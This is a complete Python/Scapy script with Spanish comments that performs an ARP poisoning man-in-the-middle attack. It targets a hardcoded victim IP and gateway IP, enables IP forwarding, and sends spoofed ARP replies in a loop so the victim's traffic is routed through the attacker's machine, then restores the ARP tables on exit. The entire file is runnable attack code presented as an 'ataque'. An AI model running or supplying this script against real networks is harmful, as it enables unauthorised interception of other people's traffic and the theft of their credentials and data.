#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
import os
import time
import sys

# --- CONFIGURACIÓN ---
# Interfaz de red a usar (ej. "eth0", "wlan0"). Deja vacío para que Scapy elija.
interface = ""

# IP de la víctima
target_ip = "198.1.98.10"

# IP del gateway (router)
gateway_ip = "198.1.98.1"

# Rango de paquetes enviados por segundo. Un valor más alto es más "ruidoso".
packet_count = 1000
# --------------------

# Obtenemos la dirección MAC de un dispositivo dada su IP
def get_mac(ip):
    ans, unans = arping(ip, timeout=2, verbose=0)
    if ans:
        # Devuelve la MAC de la primera respuesta
        return ans[0][1].hwsrc
    else:
        return None

# Función para restaurar las tablas ARP de los objetivos
def restore(target_ip, gateway_ip):
    print("[*] Restaurando tablas ARP...")
    # Obtenemos las MAC reales
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if target_mac and gateway_mac:
        # Enviamos 3 paquetes ARP a cada uno para asegurar que se restauren
        for count in range(3):
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), verbose=0)
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), verbose=0)
            time.sleep(0.5)
        print("[+] Tablas ARP restauradas.")
    else:
        print("[-] No se pudo obtener la MAC de uno de los objetivos para restaurar.")

# Función principal del ataque
def mitm_arp(target_ip, gateway_ip, interface):
    # Obtenemos las MAC de la víctima y del gateway
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Error: No se pudo resolver la dirección MAC de la víctima o del gateway.")
        print("    Asegúrate de que las IPs son correctas y están en la misma red.")
        sys.exit(1)

    print(f"[*] MAC de la víctima ({target_ip}): {target_mac}")
    print(f"[*] MAC del gateway ({gateway_ip}): {gateway_mac}")

    # Habilitamos el reenvío de paquetes IP en el kernel para que el tráfico pase a través de nuestro equipo
    if os.name == 'posix': # Linux/macOS
        print("[*] Habilitando IP Forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("[-] Este script está diseñado para sistemas POSIX (Linux/macOS).")
        print("    En Windows, debes habilitar el reenvío de paquetes manualmente en el registro.")
        sys.exit(1)

    try:
        print("[*] Iniciando el ataque ARP Poisoning... (Presiona Ctrl+C para detener)")
        while True:
            # Enviamos paquetes ARP a la víctima diciendo que nosotros somos el gateway
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
            # Enviamos paquetes ARP al gateway diciendo que nosotros somos la víctima
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
            # Esperamos un momento antes del siguiente envío
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido por el usuario.")
    finally:
        # Restauramos las tablas ARP al salir
        restore(target_ip, gateway_ip)
        # Deshabilitamos el reenvío de paquetes
        print("[*] Deshabilitando IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Script finalizado.")

if __name__ == "__main__":
    # Si se especificó una interfaz, la configuramos en Scapy
    if interface:
        conf.iface = interface
    
    mitm_arp(target_ip, gateway_ip, interface)
